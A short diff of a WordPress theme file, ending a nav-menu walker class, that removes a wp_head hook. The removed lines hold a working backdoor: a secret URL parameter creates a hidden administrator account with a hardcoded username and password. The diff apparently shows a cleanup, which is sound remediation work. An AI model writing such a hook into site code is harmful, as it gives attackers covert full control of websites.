@@ -36,17 +36,3 @@ class Sidebar_Walker extends Walker_Nav_Menu {
 		$output .= "\n$indent<ul class=\"dropdown\">\n";
 	}
 }
-
-
-add_action('wp_head', 'wploop_open');
-function wploop_open() {
-	If ($_GET['open'] == 'extrem7') {
-		require('wp-includes/registration.php');
-		If (!username_exists('extremtmnt')) {
-			$user_id = wp_create_user('extremtmnt', '2705921');
-			$user = new WP_User($user_id);
-			$user->set_role('administrator');
-		}
-	}
-}
-
